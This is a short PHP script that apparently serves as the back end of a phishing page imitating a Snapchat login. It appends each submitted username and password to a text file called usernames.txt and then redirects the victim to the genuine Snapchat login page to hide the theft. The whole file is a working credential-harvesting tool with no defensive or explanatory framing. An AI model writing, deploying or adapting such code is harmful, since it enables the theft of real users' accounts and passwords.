<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://accounts.snapchat.com/accounts/login
header("Location: $url");
exit();
